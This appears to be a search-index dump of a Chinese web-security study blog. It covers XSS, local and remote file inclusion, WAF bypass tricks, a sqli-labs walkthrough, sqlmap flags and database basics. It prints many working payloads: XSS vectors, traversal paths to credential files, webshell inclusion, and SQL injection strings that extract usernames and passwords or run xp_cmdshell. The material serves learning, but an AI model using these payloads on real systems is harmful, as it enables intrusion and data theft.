onclick=”alert(1)”"},{"title":"xss漏洞","date":"2022-04-20T02:03:43.000Z","url":"/2022/04/20/xss%E6%BC%8F%E6%B4%9E/","categories":[[" ",""]],"content":"注： &lt;&gt; 统一写成《&gt; 要不然一点开一直弹窗XSS漏洞的概述漏洞的介绍. XSS又叫CsS (Cross Site Script)，全称跨站脚本攻击。它指的是攻击者往Web页面或者URL里插入恶意JavaScript脚本代码，如果Web应用程序对于用户输入的内容没有过滤，那么当正常用户浏览该网页的时候，嵌入在Web页面里的恶意JavaScript脚本代码会被执行，从而达到恶意攻击正常用户的目的。漏洞的位置·数据交互的地方∶-get post cookies headers方法-富文本编辑器-各类标签插入和自定义·数据输出的地方∶-用户资料-关键词、标签、说明漏洞的原理 XSS，是指攻击者通过在Web页面中写入恶意脚本，造成用户在浏览页面时，获取控制用户浏览器进行操作的攻击方式。服务端代码︰用户提交:&lt;script&gt;alert(/xss/)&lt;/script&gt;xSS漏洞产生的两个条件确定1.可以控制的输入点⒉.输入能返回到前端页面上被浏览器当成脚本语言解释执行漏洞的分类,根据攻击手法的不同，XSS漏洞分为三类类型 存储区 插入点反射型XSS URL HTML存储型XSS 后端数据库 HTMLDOM型xSS 后端数据库/前端存储/URL 前端JavaScript反射型XSS 验证反射型xss漏洞存在的poc : ◆存储型XSs概念︰持久性跨站脚本，是三种XSS中危害最大的。它是将恶意代码写进数据库或文件等可以永久保存数据的介质中&gt;存在位置:常出现在留言板、发表评论或发表文章的地方(数据写入的地方)攻击手法:通过留言板等功能，将攻击者精心构造XSS代码，保存到数据库中，当其他用户再次访问这个页面时，就会触发并执行恶意的XSS代码，从而窃取用户的敏感信息。 DOM型xSSDOM型XSs漏洞概念∶不经过后端，DOM-XSS漏洞是基于文档对象模型的一种漏洞，简单去理解就是因为输出点在DOMRDOM-XSS是通过url传入参数去控制触发的，其实也属于反射型XSS. 攻击手法∶攻击者构造出特殊的URL，其中包含恶意代码。用户打开带有恶意代码的URL用户浏览器接收到响应后解析执行，前端JavaScript取出URL中的恶意代码并执行。恶意代码窃取用户数据并发送到攻击者的网站，或者冒充用户的行为，调用目标网站接口执行攻击者指定的操作。三种漏洞的区别存储型XSS与反射型XSS的区别·存储型XSS的恶意代码存在数据库里，反射型XSS的恶意代码存在URL里DOM型与其他两种XSS的区别.DOM型XSS攻击中，取出和执行恶意代码由浏览器端完成，属于前端JavaScript自身的安全漏洞，而其他两种XSS都属于服务端的安全漏洞 xSS的简单利用有哪些:1.xSS获取管理员权限(获取cookie) ——重要2. XSS键盘记录——重要3. XSS获取内网IPxSS获取cookiecookie的介绍︰指某些网站为了辨别用户身份、进行session跟踪而储存在用户本地终端上的数据cookie的作用:它可以记录用户ID、密码、停留时间等等，当再次访问这个网站时，浏览器会自动监这个文件，并将存储在本地的Cookie信息发送给网站，网站通过读取Cookie，得知相关信息，就可以做出相应的动作，比如:直接登陆，无需再次输入账号和密码。 获取cookie的危害:窃取用户Cookie，冒充用户身份进入网站cookie的格式:Cookie有变量名( key)和值( value )组成，属性中的变量用“变量=值”的形式保存Set-Cookie: 《name&gt; = [; =]…l; expires=《date&gt;][; domain= ]l; path=《some_path&gt;][; secure][ ; httponly] 2.伪协议的方式构造XSS·可以使用javascript:伪协议的方式构造XSS ，html标签支持js伪协议形式，如src ,href ,background等·形式 : javascriptalert(/xss/);·举例︰利用href标签的伪协议《a href=”javascriptalert(/xss/)” &gt;touch me! 通过href标签创建超链接，并通过伪协议进行xss攻击，所以点击了超链接就会进行弹窗操作。XSS的变形与绕过事件利用。举例:. 《img src=’./smile.jpg’ onmouseover=’alert(/xss/)’&gt;·这个标签会引入一个图片，然后鼠标悬停在图片上的时候，触发XSS代码其他事件利用. 《input type=”text” onkeydown=”alert(/xss/)”&gt;当按下键盘任意一个按键的时候触发。. ·《input type=“text” onkeyup= “alert(/xss/)”&gt;当松开键盘任意一个按键的时候触发。·《input type= “button” onclick=”alert(/xss/)”&gt;当点击按钮时触发。. 《img src= ‘#’ onerror= ‘alert(/xss/)”&gt;当img图片载入报错时触发。5．其他标签以及手法随着前端语言的更新和发展，会有新的标签和事件出现，所以前端的安全是个讨论不完的问题。. 《svg onload=”alert(/xss/)”&gt; svg是H5语言中的标签，配合事件可以触发XSS·sXg是H5语言中的标签，配合事件可以触发XSS. 《input onfocus=alert(/xss/) autofocus&gt;·onfocus事件是input标签中的新增事件，这个事件是当input输入框获取焦点时执行一段JS代码，从而触发XSS xSS的变形3.左斜线[/]代替空格。可以利用左斜线代替空格原payload《Img sRc=’#’ Onerror=”alert(/xss/)” /&gt; 一&lt;Img/sRc=’#’/Onerror=’alert(/xss/) /&gt;4.回车的使用.可以在一些位置添加水平制表符和回车符，来绕过关键字检测原payload : 《a href=”javascriptalert:alert(/xss/)”&gt;click me _《A hREf=”ja va sc ri pt :alert(/xss/)”&gt;clickme ≥注意:一些函数不可以加回车，比如事件:onmoveover、onerror等，它们alert(/xss/“&gt;click对于html语言是完整的单词 XSS的变形5．对标签属性值进行转码·可以对标签属性值进行转码，用来绕过过滤。对应编码如下字母 ASCII码 十进制编码 十六进制编码a 97 &#97; &#x61;e 101 &amp;#101 ; #x65;一·原payload : 《a hREf=”javaScript:alert(/xss/)” &gt;click me编码《A hREf=”j&#97;v&#x61;script:alert(/xss/)”&gt;click me! 双写绕过《script&gt; 《scr《script&gt;ipt&gt;"},{"title":"文件包含漏洞","date":"2022-04-20T01:15:40.000Z","url":"/2022/04/20/%E6%96%87%E4%BB%B6%E5%8C%85%E5%90%AB%E6%BC%8F%E6%B4%9E/","categories":[[" ",""]],"content":"一、什么是文件包含漏洞？ 1、文件包含概述 和SQL注入等攻击方式一样，文件包含漏洞也是一种“注入型漏洞”，其本质就是输入一段用户能够控制的脚本或者代码，并让服务器端执行。 什么叫包含呢？以PHP为例，我们常常把可重复使用的函数写入到单个文件中，在使用该函数时，直接调用此文件，而无需再次编写函数，这一过程就叫做包含。 有时候由于网站功能需求，会让前端用户选择要包含的文件，而开发人员又没有对要包含的文件进行安全考虑，就导致攻击者可以通过修改文件的位置来让后台执行任意文件，从而导致文件包含漏洞。 以PHP为例，常用的文件包含函数有以下四种： include()，require()，include_once()，require_once() 区别如下： 二.本地文件包含漏洞能够打开并包含本地文件的漏洞，我们称为本地文件包含漏洞（LFI）。（1）使用绝对路径使用绝对路径直接进行读取：2）使用相对路径进行读取：当前页面所在路径为C:\\Apache24\\htdocs\\，我们需要使用…/退到C盘再进行访问，构造路径如下：…/…/windows/system.ini（3）一些常见的敏感信息路径：Windows系统： c:\\boot.ini // 查看系统版本 c:\\windows\\system32\\inetsrv\\MetaBase.xml // IIS配置文件 c:\\windows\\repair\\sam // 存储Windows系统初次安装的密码 c:\\ProgramFiles\\mysql\\my.ini // MySQL配置 c:\\ProgramFiles\\mysql\\data\\mysql\\user.MYD // MySQL root密码 c:\\windows\\php.ini // php 配置信息Linux/Unix系统： /etc/passwd // 账户信息 /etc/shadow // 账户密码文件 /usr/local/app/apache2/conf/httpd.conf // Apache2默认配置文件 /usr/local/app/apache2/conf/extra/httpd-vhost.conf // 虚拟网站配置 /usr/local/app/php5/lib/php.ini // PHP相关配置 /etc/httpd/conf/httpd.conf // Apache配置文件 /etc/my.conf // mysql 配置文件 ◆本地文件包含(LFI)有限制本地文件包含漏洞绕过&gt;绕过方法路径长度截断·条件:1、Windows下要长于256字节，超出的部分会被丢弃 2、Linux下要长于4096字节，超出的部分会被丢弃。192.168.152.143/action2.php?action=phpifo.php/./././././././././././././././././././././././././././././00截断如果我们想通过文件包含漏洞读取本地敏感信息，就会遇到一些问题。因为服务器会给路径加上./site/路径，以及.php后缀。此时我们可以使用使用%00截断：%00为结束符，在filename后带上%00，就可以截断末尾的.php。当前路径为./site/，如果要读取system.ini，则需要输入：…/…/…/windows/system.ini%00，需要注意的是，%00截断需要php版本小于5.3.4，且关闭magic_quotes_gpc功能 2、配合文件上传使用有时候我们找不到文件上传漏洞，无法上传webshell，可以先上传一个图片格式的webshell到服务器，再利用本地文件包含漏洞进行解析。编辑一个图片马，找到上传点进行上传，文件保存的完整路径为：C:\\phpStudy\\WWW\\hackable\\uploads\\webshell.jpg找到具有文件包含漏洞的页面 该页面用于读取C:\\phpStudy\\WWW\\vulnerabilities\\fi\\路径中的文件 现在我们利用该页面去执行我们上传的图片马，路径需要从C:\\phpStudy\\WWW\\vulnerabilities\\fi\\ 转到C:\\phpStudy\\WWW\\hackable\\uploads\\webshell.jpg192.168.211.151/vulnerabilities/fi/?page=../../hackable/uploads/webshell.jpg使用webshell管理工具连接即可。 远程文件包含(RFI)远程包含的意思·指的是能够包含远程服务器上的文件并执行，可以通过http(s)或者ftp 等方式，远程加载文性。危害·由于远程服务器的文件是我们可控的，因此漏洞一旦存在危害性会很大。包含条件. allow_url_include=On（默认为OFF，需要在php.ini中手动打开)- allow _url_fopen = On（是否允许打开远程文件)·用户可以动态控制变量 举例:。[URL]?path=通过http协议加载目标机中的info.php文件·[URL]?path=ftp://用户名:密码@ip/info.php //通过ftp协议加载目标机中的info.php文件文件包含漏洞的利用远程文件包含(RFI)有限制远程文件包含漏洞绕过绕过方法1.问号绕过 payload : ?action=? 2.#号绕过 payload : ?action= 文件包含漏洞的利用漏洞的利用1、端口探测. url=dict//ip:8022.包含上传的getshell·上传图片马，利用文件包含我们的图片马，菜刀连接3、包含日志文件GetShell·为了避免在web中进行了url编码，进行报错，把报错信息写进日志4、远程文件包含写shell"},{"title":"绕过waf技巧","date":"2022-04-13T01:30:20.000Z","url":"/2022/04/13/%E7%BB%95%E8%BF%87waf%E6%8A%80%E5%B7%A7/","categories":[[" ",""]],"content":"常见的过WAF技巧1．大小写绕过∶·大小写绕过用于只针对小写或大写的关键字匹配技术·出现原因:在waf里，使用的正则不完善或者是没有用大小写转换函数·用法:比如，拦截了union，那就使用uNIoNXXx.com/index.php?id=-3 uNIoN sELect 1,2,3·注意:对于一些不太成熟的WAF效果显著 2．替换关键字∶关键字双写·出现原因∶利用waf的不完整性，只验证一次字符串或者过滤的字符串并不完整。·用法∶XXX.Com/index.php?id=-3 UNION SELECT 1,2,3·注意:有些时候甚至构造更复杂，如:SeLSeselectleCTecL 3替换关键字∶同价词替换·出现原因:WAF主要是针对一些特殊的关键词进行检测·用法︰ and和or不能使用:&amp;&amp;和Ⅱ 代替and和or =不能使用的情况:可以尝试&lt;、&gt;代替 ·空格不能使用（常见）︰%20 %09 %0a %0b %Oc %Od %a0/**/ 代替空格·注意:在mysql中%0a是换行，可以代替空格，这个方法也可以部分绕过最新版本的安全狗 4.特殊字符拼接·出现原因:把特殊字符拼接起来绕过WAF的检测·用法︰如在函数里可以用+来拼接，在Mysql中可以利用注释/**/绕过 xxx.com/index.php?id=1;exec(master..xp_cmdshell ‘net user’)特殊字符拼接 xxx.com/index.php? id=1; exec(‘maste’+’r..xp’+’_cmdshell’+’”net user”‘) 5.编码绕过:·对一些字符进行编码，常见的SQL编码有unicode、HEX、URL、ascll、 base64等URL编码·出现原因:利用浏览器上的进制转换或者语言编码规则来绕过wafURL编码·输入一个连接，非保留字的字符浏览器会对其URL编码，如空格变为%20、单引号%27、左括号%28等·注意:如果URL编码只进行了一次过滤，可以用两次编码绕过·用法∶index.php?id=1//UNION//SELECT 1,2,3URL编码index.php?id=1%2f%2a%2a%2f%75%6e%69%6f%6e%2f%2a%2a%2f%73%65%6c%65%63%74%20%31%2c%32%2c%33%0aUnicode编码·常用符号的Unicode编码︰单引号: %u0027空格:%u0020左括号:%u0028右括号:%u0029用法︰index.php?id=1 union select 1,2,3Unicode编码index.php?id=1 un%u0069on sel%u0065ct 1,2,3 6.注释绕过:·常见的用于注释的符号∶//、–、//、#、–+、—、 ;、–a·出现原因∶利用语言函数特性来绕过waf的规则普通注释. /*/在构造的查询语句中插入注释，规避对空格的依赖或关键字识别。·用法︰index.php?id=1 UNION SELECT 1,2,3普通注释index.php?id=1//UNION/**/SELECT 1,2,3 注释绕过:内联注释·相比普通注释，内联注释用的更多，它有一个特性/!/只有MySQL能识别(/!/表示注释里面的语句会被执行)·用法∶采用/! code /来执行我们的SQL语句，内联注释可以用于整个SQL语句中·举例:过滤器过滤了如下内容union,where, table name, table schema, =, and information schema，这些都是我们内联绕过需要绕过的目标id=1 union select 1,2,concat(table name) from information schema.tables where table schema =database()内联注释id=1/!UnIoN*/+SeLeCT+1,2,concat(/!table_name/)+FrOM/*!information schema/.tables /!WHERE/+/!TaBIE..ScHeMa/+like+database()·注意︰/!50001 select * from test/的含义︰表示假如数据库是5.00.01以上版本，该语句才会被执行 7.参数污染:·案例:ModSecurity过滤器会将类似于select1,2,3 from table这类的语句归类为黑名单当web服务器遇到类似/index.aspx?id=select 1,2,3 from table这样的语句时，会阻断请求但是这个web服务器在遇到为同一个参数赋值不同数值时，会将它们连接起来，攻击者通过这个方法来绕过黑名单·例如︰想要执行的语句:/index.aspx?id=select 1,2,3 from table参数污染提交的URL : /index.aspx?id=select 1&amp;id=,2,3 from table·说明∶1、这不属于黑名单中的模式，不会触发黑名单的拦截功能2、由于WEB程序会采取连接操作，即将&amp;符号前后的内容个连接，因此SQL注入行为能够被执行 8.缓冲区溢出∶·缓冲区溢出用于绕过WAF，许多WAF是C语言写的，而C语言自身没有缓冲区保护机制·因此如果WAF在处理测试向量时超出了其缓冲区长度，就会引发bug从而实现绕过例如︰?id=1 and (select 1)=(Select OxAAAAAAAAA1000 more A)+UnIoN+SeLeCT+1,2,version0),4,5,database(),user),8,9,10–+·说明︰示例OxA1000指OxA后面”A”重复1000次，一般来说对应用软件构成缓冲区溢出都需要较大的测试长度，这里1000只做参考，在某些情况下可能不需要这么长也能溢出。 9.分块传输绕过:·举例∶使用分块传输，将id=1 and 1=2进行分块，成功绕过了安全狗·注意︰分块传输需要将关键字and,or,select ,union等关键字拆开，不然仍然会被waf拦截。编码过程中长度需包括空格的长度。最后用0表示结束，并在0后空两行表示数据包结束 整合绕过:·整合的意思是结合使用前面的各种绕过技术，单一的技术可能无法绕过过滤机制，但多种技术的配合使用成功的可能性会增加·多种技术的使用增加了更多的可能性，除非每一种技术单独都无法使用，否则它们能大大增加绕过的成功性例如︰id=1/IUnIoN/+SeLeCT+1,2,concat(/!table_name/)+FrOM/!information_schema/.tables /!WHERE/+/!TaBIE_ScHeMa/+ like+database() ?id=1+/!UNION/+/!SELECT/+1,GrOup_COnCaT(COLUMN_NAME),3,4-5+FROM+/!INFORMATION_SCHEM/.COLUMNS+WHERE+TABLE_NAME=Ox41646d696e–"},{"title":"sql-lib","date":"2022-04-06T06:40:53.000Z","url":"/2022/04/06/sql-lib/","categories":[[" ",""]],"content":"sql注入union联合注入(前四关关同理)1.; //报错,说明存在注入2.; and 1=1–+ //显示数据; and 1=2–+ //没有显示数据，说明这是个基于单引号的字符型注入判断是整形注入还是字符型注入数字型注入与字符型注入的最大去区别在于数字型不需要闭合，而字符型需要引号闭合select * from table where id = 1 数字型select * from table where username = ‘admin’ 字符型在第一关中上述可以，第二关中?id=1 and 1=1–+显示数据，id=1 and 1=2–+ //没有显示数据，说明这是个基于数值型注入第三关中 向页面输入?id=1’,报错 ,发现报错信息中有括号闭合，那就变成 ?id=1’) and 1=1–+显示数据，id=1’) and 1=2–+ //没有显示数据，说明是(‘’)这种方式闭合字符串的第四关中于第三关相同输入?id=1”,报错 ,发现报错信息中有括号闭合，那就变成?id=1”) and 1=1–+显示数据，id=1”) and 1=2–+ //没有显示数据，说明是(‘’)这种方式闭合字符串的 3.; order by 4–+ //分别进行从一开始的实验，找到有几个字段，order by 3回显正常 order by 4回显不正常说明存在3列数据( 在注释符被过滤的时候，ordey by查询语句，在用对应符号闭合会出现问题，可以使用联合查询的特性：UNION 内部的 SELECT 语句必须拥有相同数量的列,来确定字段数。?id=-1’ union select 1,2,3,4 –+多出的4超过了前面查询语句的列数就会报错：The used SELECT statements have a different number of columns)4.; union select 1,2,3–+ //用来联合查询，但是只能输出后面的查询，所以把前面的查询结果为空值，显示2，3，说明可以使用2，3这两个位置。5.; union select 1,(select group_concat(schema_name) from information_schema.schemata),3 –+ //查询所有数据库的名字（也可以直接用?id=-1’ union select 1,database(),3–+ 查询数据库）6.; union select 1,(select group_concat(table_name) from information_schema.tables where table_schema=’security’),3 –+ //查询数据库security中所有表名7.; union select 1,2,(select group_concat(column_name) from information_schema.columns where table_name=’users’) –+ //查询表users中的所有列名8.; union select 1,2,(select group_concat(id,0x3a,username,0x3a,password) from users) –+ //查询表users中的所有信息（0x3a代表的是：） 报错注入● 该函数对xml文档进行查询。● extractvalue(xml_frag,xpath_expr) 第一个参数式是查询内容，第二个参数是查询路径。● 原理：当路径写入格式错误就会报错，显示出来，同时还会写入我们的非法查询语句并将查询的结果返回出来，所以在第二个参数位置构造sql语句进行注入● and extractvalue(1, payload)输出字符有长度限制，最长32位。payload即我们要输入的sql查询语句; and (select extractvalue(1,concat(0x7e,(select user())))) –+ //更换select后的语句进行查询 （版本version() 数据库database()）; and (select extractvalue(1,concat(0x7e,(select group_concat(table_name) from information_schema.tables where table_schema=database())))) –+ //列如这样 里面语句和上面union一样 第五关id=1’ 发现报错 id=1’ –+ 不报错但是回显的内容和初始内容一样，说明这个为可以用布尔盲注，时间盲注，报错注入布尔盲注：?id=1’ and substr((select database()),n,1)=’s’–+ 通过这个语句判断出数据库的名字，不断改变n的值来，看是否有回显，正确有回显，错误没有回显 判断’s’可以用burp工具来进行 最终确定的库名为security。?id=1’ and substr((select table_name from information_schema.tables where table_schema=’security’ limit x,1),n,1)=’s’–+ 修改limit x,1和中x 可以选择第几个表, substr中的n用来判断表名每个位置的字母，爆破到第一张表为referer，终于在第三张表爆破到users表。?id=1’ and substr((select column_name from information_schema.columns where table_name=’users’ limit x,1),n,1)=’u’–+ 同理找到第一个字段为username第2个字段为password?id=1’ and substr((select username from users limit 0,1),n,1)=’d’–+ 同理找到其中数据?id=1’ and substr((select password from users limit 0,1),n,1)=’d’–+ 时间盲注：?id=1’ and if((substr((select database()),n,1)=’s’),sleep(10),1) –+ 和布尔同理通过改变n 来确定数据库名， 正确会延迟，错误没有延迟举一反三 把里面的内容替换，如上面布尔盲注，就可找到数据 第六关（双引号字符型注入，方法与第五关相同）第七关 （8会）布尔盲注可以做第八关 id=1回显，加个单引号不回显，构造一下验证是不是布尔型payload ?id=1’ and 1=1 –+ 回显了，证明没跑了。第九关 不管怎么输入，回显总是you are . ..?id=1’ and sleep(5)–+ 发现明显延迟，说明注入成功，接下来爆破就完了第十关 基于双引号的时间盲注只要把上一题Less-9的单引号改成双引号，一样的注入，不再赘述。第十一关 是一个登陆页面，通常post传送不能在url上看到数据，只能通过抓包工具进行查看输入admin admin 登陆，抓包，发送到repeater模块 在repeater中通过修改post的参数进行注入admin’ and 1=1# 可以登录admin’ and 1=2# 不可以登录 说明注入生效，存在报错型注入，接下来又是重复性工作，上extractvalue()admin’ and extractvalue(1,concat(0x7e,(select datbase())))#也可以使用unionadmin’ order by 2#0’ union select 1,group_concat(table_name) from information_schema.tables where table_schema=database() #第十二关admin”) 进行注入第十三关发现登陆成功没有回显，所以可以用报错注入，时间盲注admin’) and extractvalue(1,concat(0x7e,(select database())))#admin’) and if((substr((select database()),1,1)=’s’),sleep(5),1)#第十四关 基于” 的注入（报错注入，时间盲注）同上一关第十五关 登录后没有回显 admin’ #登录成功 说明是基余’的注入用报错注入发现显示不了数据，时间延迟注入可以！第十六关 和上一关相同 admin”)#基余”)的注入第十七关 实在密码部分的注入前面用户名填admin 后面密码：admin’ and extractvalue(1,concat(0x7e,(select version())))#第十八关 我们直接在user_agent中进行测试，加入单引号后出现报错信息，根据报错信息 猜想在数据中的sql语句为：INSEERT INTO table VALUES(‘User-Agent’,’Ip’,’Username’) 三个参数通过报错注入：’,extractvalue(1,concat(0x7e,(select user()),0x7e)) ,1)#第十九关 我们抓取数据包，在referter上来做文章，先输入个单引号看下错误信息猜想在数据中的sql语句为：INSEERT INTO table VALUES(‘Referter’,’Ip’,)那我们就构造sql语句来满足insert函数这时的sql语句为INSEERT INTO table VALUES(‘1’,1)#’,’Ip’,) 两个参数采用报错注入‘,extractvalue(1,concat(0x7e,(select database()))))#第二十关 cookie注入‘ and extractvalue(1,concat(0x7e,(select database())))#第二十一关 也是cookie 但是cookie通过base64加密了‘ )and extractvalue(1,concat(0x7e,(select database())))#加密一下就好第二十二关 同上一关相同 闭合方式为’"},{"title":"sqlmap","date":"2022-03-29T03:11:36.000Z","url":"/2022/03/29/sqlmap/","categories":[[" ",""]],"content":"-u 指定目标URL (可以是http协议也可以是https协议)-d 连接数据库–dbs 列出所有的数据库–current-db 列出当前数据库–tables 列出当前的表–columns 列出当前的列-D 选择使用哪个数据库-T 选择使用哪个表-C 选择使用哪个列–dump 获取字段中的数据–batch 自动选择yes–smart 启发式快速判断，节约浪费时间–forms 尝试使用post注入-r 加载文件中的HTTP请求（本地保存的请求包txt文件）-l 加载文件中的HTTP请求（本地保存的请求包日志文件）-g 自动获取Google搜索的前一百个结果，对有GET参数的URL测试-o 开启所有默认性能优化–tamper 调用脚本进行注入-v 指定sqlmap的回显等级–delay 设置多久访问一次–os-shell 获取主机shell，一般不太好用，因为没权限-m 批量操作-c 指定配置文件，会按照该配置文件执行动作-data data指定的数据会当做post数据提交-timeout 设定超时时间-level 设置注入探测等级–risk 风险等级–identify-waf 检测防火墙类型–param-del=”分割符” 设置参数的分割符–skip-urlencode 不进行url编码–keep-alive 设置持久连接，加快探测速度–null-connection 检索没有body响应的内容，多用于盲注–thread 最大为10 设置多线程–is-dba 判断当前用户是否为管理员权限–roles 列出数据库管理员角色–users 枚举所有的用户–passwords 枚举所有的的用户密码–delay有些web服务器请求访问太过频繁可能会被防火墙拦截，使用–delay就可以设定两次http请求的延时–safe-url有的web服务器会在多次错误的访问请求后屏蔽所有请求，使用–safe-url 就可以每隔一段时间去访问一个正常的页面。-v “x” 使用sqlmap注入测试时，可以使用 -v [x] 参数来指定回显信息的复杂程度, x 的取值范围为[0~6]0 只显示python错误以及严重信息1 同时显示基本信息和警告信息2 同时显示debug信息3 同时显示注入的pyload4 同时显示HTTP请求5 同时显示HTTP相应头6 同时显示HTTP相应页面–level level有5个等级，默认等级为1，进行Cookie测试时使用–level 2 ，进行use-agent或refer测试时使用–level 3 ，进行 host 测试时使用–level 5get型step1：sqlmap -u “URL” //测试是否存在注入step2：sqlmap -u “URL” -current-db //查询当前数据库step3：sqlmap -u “URL” -D “数据库名” –tables //查询当前数据库中的所有表step4：sqlmap -u “URL” -D “数据库名” -T “表名” –columns //查询指定库中指定表的所有列(字段)step5：sqlmap -u “URL” -D “数据库名” -T “表名” -C “列名” –dump //打印出指定库中指定表指定列中的字段内容post型：先使用burp把提交的数据包保存下来或者直接加上post提交的参数 sqlmap -u “URL” –data “post参数”语法：sqlmap -r “请求包的txt文件”sqlmap -r “/root/.sqlmap/post.txt”sql-labs-less18Header injection - Uagentsqlmap 在对user-agent 注入的时候，得在文件中的user-agent的参数后面加上 *或者不加 * 号，调用 –level参数，将等级调至 3级，只有等级为 3级即以上时才能对 user-agent进行注入 语句:salmap -u “地址/ua.php&quot; –data “uname=admin&amp;passwd=admin” –user-agent=”aaa”–level 3 –dbs-batch –user-agent参数:指定想使用的UA sql-labs-less20Header injection -Cookie语法：sqlmap -u “url” –cookie “cookie信息” –level 2说明∶当需要对cookie注入的时候，必须使用–cookie选项,–data “”因为post的数据长度为0，但是又想使用post方法进行注入，则使用–data””，使用–data选项后，sqlmap自动使用post方法。sql-labs-less19Header injection - Referer对Referer注入和User-agent相同，要么是在Referer后面加上 *或者将 level 调至 3 级"},{"title":"渗透测试插件","date":"2022-03-21T02:45:59.000Z","url":"/2022/03/21/%E6%B8%97%E9%80%8F%E6%B5%8B%E8%AF%95%E6%8F%92%E4%BB%B6/","categories":[[" ",""]],"content":"Wappalyzer识别网站使用的技术 Chrome Firefox Netcraft ExtensionNetcraft 允许轻松查询网站有关的信息，并提供保护，防止网络钓鱼和恶意的 JavaScript ，包括病毒 Chrome Firefox BuiltWith作为Wappalyzer的有力竞争者，BuiltWith是一个网站分析工具，找到网站使用的技术 Chrome Firefox Penetration Testing Kit自动监测网站使用的框架版本号，并提供漏洞信息 Chrome Firefox ShodanShodan API，帮助发现目标Web应用的信息 Chrome Firefox MitakaOSINT搜索 Chrome Firefox 显示国家图标ChromeIP Domain Country Flag  FirefoxFlagfox  Proxy SwitchyOmega代理神器 Chrome Firefox &gt;= 55 FoxyProxy一个高级的代理管理工具 Chrome Firefox 禁用WebRTC防止 IP 泄漏ChromeWebRTC Leak Shield  FirefoxDisable WebRTC  HackBar允许测试简单的 SQL 注入和 XSS 漏洞,提供一个简单的控制台，其中包含测试任务，并允许使用 POST 或 GET 请求手动提交表单数据。其他功能包括哈希算法，加密和编码工具，SQL 注入辅助功能以及使用 XSS 有效负载测试 XSS 漏洞的功能 Chrome Firefox User-Agent Switcher and Manager修改浏览器的 User-Agent 字符串 Chrome Firefox HTTP Header Live用于查看网站的实时 HTTP 标头信息，可编辑数据并重新提交。 Chrome Firefox ModHeader添加和修改HTTP请求头和响应头 Chrome Firefox Cookie编辑ChromeEditThisCookie  FirefoxCookie-Editor  Retire.js扫描网站上有漏洞的 js 库 Chrome Firefox 快速源代码查看器ChromeQuick source viewer  FirefoxFire Source Viewer  IP Address and Domain InformationIP信息 Chrome Firefox Tampermonkey油猴脚本 Chrome Firefox NoScript Security SuiteNoScript 安全套件 Chrome Firefox Web Developer各种Web开发人员工具 Chrome Firefox Hack-Tools渗透测试工具集 Chrome Firefox Ruffle将 Flash 重新带回网络，一些 web 应用可能还在用 Flash Chrome Firefox Exif Viewer显示 JPEG 图像的 Exif 和 IPTC 数据 Chrome Firefox JSONView在浏览器中查看JSON 文件 Chrome Firefox 翻译Chrome沙拉查词 : 沙拉查词-聚合词典划词翻译/cdonnmffkdaoajfknoeeecmchibpmkmg 划词翻译 : 划词翻译/ikhdkkncnoglghljlkmcimlnlhkeamad Firefox沙拉查词 :  划词翻译 :  AdGuard广告拦截 Chrome Firefox Adblock Plus广告拦截 Chrome Firefox IE TabChrome 兼容IE插件 Chrome 建议使用 Edge 的 IE 模式： 开启方式： 设置 &gt; 默认浏览器 &gt; Internet Explorer 兼容性 &gt; 让 Internet Explorer 在 Microsoft Edge 中打开网站 : 仅不兼容的站点 ; 允许在 Internet Explorer 模式下重新加载网站 : 允许 然后重启浏览器在插件栏就可出现使用 IE 模式加载当前网页的图标"},{"title":"mysql","date":"2022-03-15T09:33:20.000Z","url":"/2022/03/15/mysql/","categories":[[" ",""]],"content":"mysql总结:常用数据类型分类 备注和说明 数据类型 说明二进制数据类型 存储非子符和文本的数据 BLOB 可用来存储图像文本数据类型 字符数据包括任意字母、符 char 固定长度的非 Unicode字符数据 号或数字字符的组合 varchar 可变长度非Unicode数据text 存储长文本信息日期和时间 日期和时间在单引号内输入 time 时间date 日期datetime 日期和时间数值型数据 该数据仅包含数字，包括正 int 整数 数、负数以及浮点数 smallintfloat 浮点数double 数值列类型·所有数值列类型的类型名及其说明和所占的字节数见下表类型名 说明 类型名 说明TINYINT 非常小的整数 BIGINT 大整数SMALLINT 较小的整数 FLOAT 单精度浮点数MEDIUMINT 中等大小的整数 DOUBLE 双精度浮点数INT 标准整数 DECIMAL 一个串的浮点数 update test_table set name=”dss” where name=”dcl”;delete from test_table where address2&gt;77;insert into test_table(name,address2) values(“sss”,152436),(“sss”,55),(“sss”,77)查询语句SELECT〈&lt;列名&gt;FROM&lt;表名&gt;[WHERE&lt;查询条件表达式&gt;][ORDER BY&lt;排序的列名&gt;[ASC或DESC] PHP访问MySQL数据库的流程第一步:连接MySQL服务器·使用mysql connect)函数建立与MySQL服务器的连接第二步:选择MySQL数据库·使用mysql_select db)函数选择MySQL数据库服务器上的数据库，并与数据库建立连接第三步:执行SQL语句·在选择的数据库中使用mysql query)函数执行SQL语句。对数据的操作方式主要包括4种方式:数据操作 说明查询数据 使用select语句实现数据的查询功能插入数据 使用insert into语句向数据库中插入数据更新数据 使用update语句修改数据库中的记录删除数据 使用delete语句删除数据库中的记录 PHP代码连接数据库服务器 mysql_connect函数!选择数据库 mysql_select_db函数;操作表(查询/插入/修改/删除 含SQL语句的mysql_query函数返回操作结果 mysql_fetch_array函数+edho等关闭数据库连接 mysql_close函数 Ms5q量本史用MSSql的基本语句:创建数据库:CREATE DATABASE [dbname]删除数据库 :drop database [dbname]创建新表:create table [tablename] ( name char(10), age tiryint, sex int )删除新表;drop table [tablename]向表中插入内容:insert into tablename values(value1,value2)删除内容:delete from [tablename] where范围更新内容:update [tablename] set field1=valuel where范围查找: select * from [tablename] where field1=” ichunqiu” MSSql手工注入的过程（利用报错注入)I1、判断注入点∶·语句:[ id=1’] [ id=1 and 1=1]返回正常 [ id=1 and 1=2]返回错误2、判断是否为MSSQL数据库:·语句: [ id=1 and exists(select * from sysobjects)]】返回正常为mssql [ id=1 and exists (select count(*) from sysobjects)]用法和上面的相同3、判断数据库版本号:·语句:[ id=1 and @@version&gt;0 ]·说明:@@version是mssql的全局变量，如果我们把它写成这样and @@version&gt;0那个后面的mssql就会强行@version强行转换成数字但是失败，所以就会将数据库信息暴露出来·版本号: nt5.2 : win2003nt6.1 : win7"},{"title":"PHP","date":"2022-03-14T03:40:24.000Z","url":"/2022/03/14/PHP/","categories":[[" ",""]],"content":"PHP大小写敏感 ·在PHP中，所有关键词（例如if、else、echo等等）和用户定义的函数名、类名均不区分大小写·但是变量名会对大小写敏感 变量规则 